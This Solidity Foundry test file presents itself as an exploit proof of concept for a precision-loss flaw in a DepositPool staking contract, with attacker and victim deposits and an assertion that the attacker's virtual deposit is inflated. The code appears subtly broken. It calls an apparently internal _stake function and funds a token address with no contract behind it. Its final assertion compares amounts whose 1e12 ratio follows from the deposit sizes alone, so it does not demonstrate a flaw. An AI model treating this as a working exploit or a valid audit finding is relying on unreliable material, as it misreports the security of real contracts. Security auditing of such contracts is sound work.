// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./DepositPool.sol"; // Assuming the DepositPool contract is available

contract ExploitTest is Test {
    DepositPool depositPool;
    address attacker = address(0x1);
    address victim = address(0x2);
    address depositToken = address(0x3);
    address distributor = address(0x4);

    uint256 constant PRECISION = 1e18;

    function setUp() public {
        // Deploy the DepositPool contract
        depositPool = new DepositPool(depositToken, distributor);

        // Fund the attacker and victim with deposit tokens
        deal(depositToken, attacker, 1e24); // 1 million tokens
        deal(depositToken, victim, 1e24); // 1 million tokens

        // Set initial state
        vm.prank(attacker);
        IERC20(depositToken).approve(address(depositPool), type(uint256).max);
        vm.prank(victim);
        IERC20(depositToken).approve(address(depositPool), type(uint256).max);
    }

    function test_exploit() public {
        // Step 1: Attacker deposits a large amount to cause precision loss
        vm.prank(attacker);
        depositPool._stake(attacker, 0, 1e18, 1, 0, address(0));

        // Step 2: Victim deposits a normal amount
        vm.prank(victim);
        depositPool._stake(victim, 0, 1e6, 1, 0, address(0));

        // Step 3: Check the virtualDeposited_ values
        uint256 attackerVirtualDeposited = depositPool.getUserData(attacker, 0).virtualDeposited;
        uint256 victimVirtualDeposited = depositPool.getUserData(victim, 0).virtualDeposited;

        // Assert the vulnerability: Attacker's virtualDeposited_ is disproportionately high
        assertGt(attackerVirtualDeposited, victimVirtualDeposited * 1e12); // Arbitrary large factor to show discrepancy
    }
}